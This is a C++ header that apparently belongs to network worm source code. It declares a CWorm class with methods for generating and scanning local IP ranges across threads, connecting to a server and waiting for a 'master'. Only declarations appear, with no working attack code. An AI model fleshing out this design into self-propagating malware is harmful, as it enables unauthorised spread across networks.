#pragma once
#include <vector>
#include <string>
#include <map>
#include <thread>
#include "CCASQueue.h"
using namespace std;

class CWorm
{
public:
	CWorm();
	~CWorm();
	void Scan();
	void Init();
	void CWorm::GenerateScanIps();
	void CWorm::Dequeue();

	
	void CWorm::Launch();

	static void WINAPI pthread_sacn(LPVOID lpParamter);
private:
	BOOL Connect(char *lpszServerIp, int iServerPort);
	void WaitMaster();
	vector<string> split(const string& str, const string& delim);
	
public:
	int M_SCACNN_MAX_THREADS;

	vector<string> m_LocalIps;
	vector<string> m_LocalMasks;
	CCASQueue<string> *m_IpsQueue;
private:
	vector<int> numbers;
	vector<thread> ts;
	
};

